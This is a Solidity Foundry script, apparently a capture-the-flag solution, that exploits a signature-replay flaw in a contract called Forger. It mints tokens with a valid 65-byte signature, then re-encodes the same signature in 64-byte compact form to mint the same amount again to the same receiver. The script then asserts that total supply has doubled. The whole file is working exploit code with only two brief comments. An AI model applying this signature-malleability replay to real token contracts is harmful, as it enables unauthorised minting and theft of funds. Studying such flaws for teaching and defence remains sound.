// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Script} from "forge-std/Script.sol";
import {Forger} from "./Forger.sol";

contract ForgerScript is Script {
    address constant FORGER_ADDR = 0xec5171F9c006f3a0BCF6dA72BF09cbc13e63D6A7;

    function run() public {
        address receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
        uint256 amount = 100 ether;
        bytes32 salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
        uint256 deadline = 115792089237316195423570985008687907853269984665640564039457584007913129639935;

        Forger forger = Forger(FORGER_ADDR);
        vm.startBroadcast();

        // The first signature is valid and the tokens are minted to the receiver - 65 bytes
        // r || s || v
        bytes memory sig1 =
            hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c";

        forger.createNewTokensFromOwnerSignature(sig1, receiver, amount, salt, deadline);

        // Crafting the second signature to mint the same amount of tokens to the same receiver - 64 bytes
        // r || vs
        bytes memory sig2_r = hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809";
        uint256 parity = uint8(sig1[64]) - 27;
        uint256 vs_uint =
            uint256(0x402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb) | (uint256(parity) << 255);
        bytes32 sig2_vs = bytes32(vs_uint);
        bytes memory sig2 = abi.encodePacked(sig2_r, sig2_vs);

        forger.createNewTokensFromOwnerSignature(sig2, receiver, amount, salt, deadline);

        require(forger.totalSupply() == amount * 2, "Total supply not match");

        vm.stopBroadcast();
    }
}
